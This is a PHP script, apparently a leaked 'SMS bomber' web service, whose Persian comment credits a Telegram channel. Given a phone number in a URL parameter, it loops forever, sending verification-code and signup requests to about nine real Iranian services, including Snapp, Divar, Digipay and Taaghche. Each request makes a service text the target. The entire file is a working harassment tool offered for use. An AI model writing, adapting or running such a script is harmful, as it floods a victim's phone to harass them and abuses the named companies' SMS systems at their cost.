<?php
/*
وب سرویس بخش رایگان مستر بمبر
اوپن شد در نیو سورس
به دلیل شاخ بازی 
اسکی میری منبع بزن بی ناموس نباش
@NwesoursTm
*/
set_time_limit(1);
if (isset($_GET['target'])) {
	$target = $_GET['target'];
	while (True) {
	    	    
	    file_get_contents('https://api.binjo.ir/api/panel/get_code/0'.$target);
	    
	    $url01 = 'https://app.mydigipay.com/digipay/api/users/send-sms';
	    $ch01 = curl_init($url01);
	    $payload01 = '{"cellNumber":"0'.$target.'","device":{"deviceId":"d520c7a8-421b-4563-b955-f5abc56b97ec","deviceModel":"WEB_BROWSER","deviceAPI":"WEB_BROWSER","osName":"WEB"}}';
	    curl_setopt($ch01, CURLOPT_POSTFIELDS, $payload01);
	    curl_setopt($ch01, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
	    curl_setopt($ch01, CURLOPT_RETURNTRANSFER, true);
	    $result01 = curl_exec($ch01);
	    curl_close($ch01);
	    $url0 = 'https://gw.taaghche.com/v4/site/auth/signup';
	    $ch0 = curl_init($url0);
	    $payload0 = '{"contact":"'.$target.'"}';
	    curl_setopt($ch0, CURLOPT_POSTFIELDS, $payload0);
	    curl_setopt($ch0, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
	    curl_setopt($ch0, CURLOPT_RETURNTRANSFER, true);
		// Execute the POST request
		$result0 = curl_exec($ch0);
		// Close cURL resource
		curl_close($ch0);
	    $url5 = 'https://www.echarge.ir/m/login?length=19';
		$params5 = [
			'phoneNumber' => '0'.$target
		];
		$ch5 = curl_init($url5);
		$parameters5 = http_build_query($params5);
		curl_setopt($ch5, CURLOPT_POST, true);
		curl_setopt($ch5, CURLOPT_POSTFIELDS, $parameters5);
		curl_setopt($ch5, CURLOPT_RETURNTRANSFER, true);
		curl_exec($ch5);
		curl_close($ch5);
	    $url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp';
		# Create a new cURL resource
		$ch = curl_init($url);
		#Setup request to send json via POST
		$payload = json_encode(array("cellphone" => "+98".$target));
		# Attach encoded JSON string to the POST fields
		curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
		#Set the content type to application/json
		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		# Return response instead of outputting
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		# Execute the POST request
		$result = curl_exec($ch);
		# Close cURL resource
		curl_close($ch);
		$url6 = 'https://api.divar.ir/v5/auth/authenticate';
		// Create a new cURL resource
		$ch6 = curl_init($url6);
		// Setup request to send json via POST
		$payload6 = '{"phone":"'.$target.'"}';
		// Attach encoded JSON string to the POST fields
		curl_setopt($ch6, CURLOPT_POSTFIELDS, $payload6);
		// Set the content type to application/json
		curl_setopt($ch6, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		// Return response instead of outputting
		curl_setopt($ch6, CURLOPT_RETURNTRANSFER, true);
		// Execute the POST request
		$result6 = curl_exec($ch6);
		// Close cURL resource
		curl_close($ch6);
		//cllive
		$url1 = 'https://api.cllive.ir/authentication/otp';
		// Create a new cURL resource
		$ch1 = curl_init($url1);
		// Setup request to send json via POST
		$payload1 = '{"msisdn":"0'.$target.'"}';
		// Attach encoded JSON string to the POST fields
		curl_setopt($ch1, CURLOPT_POSTFIELDS, $payload1);
		// Set the content type to application/json
		curl_setopt($ch1, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		// Return response instead of outputting
		curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
		// Execute the POST request
		$result1 = curl_exec($ch1);
		// Close cURL resource
		curl_close($ch1);
		//Snap Doctor
		file_get_contents('https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0'.$target.'/sms?cCode= 98');
		//azki
		file_get_contents('https://www.azki.com/prod/api/api/customer/register/check-phone-number?phoneNumber=azki_0'.$target);
		
	}
}


?>